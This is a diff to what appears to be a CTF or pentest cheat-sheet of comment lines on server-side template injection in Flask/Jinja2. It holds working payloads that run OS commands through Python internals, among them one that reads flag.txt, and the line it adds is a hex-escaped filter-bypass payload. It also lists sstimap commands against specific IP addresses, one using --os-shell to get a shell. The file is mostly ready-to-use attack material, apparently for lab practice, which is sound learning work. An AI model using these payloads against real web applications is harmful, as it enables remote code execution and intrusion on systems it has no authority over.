@@ -60,6 +60,7 @@
 // {{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
 // {{''.__class__.__mro__[2].__subclasses__()[40] ('flag.txt').read()}}
 // if it didn't work try https://medium.com/@nyomanpradipta120/ssti-in-flask-jinja2-20b068fdaeee
+// {{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('ls')|attr('read')()}}
 //* filter bypass in python
 // add the parameter  &filtered=*
 // then request.args.filtered will be replace with *
@@ -83,3 +84,4 @@
 // python3 sstimap.py -u http://172.17.0.2/index.php?name=test -S id
 //* reverse shell
 // python3 sstimap.py -u http://83.136.253.59:50288/index.php?name=test --os-shell
+
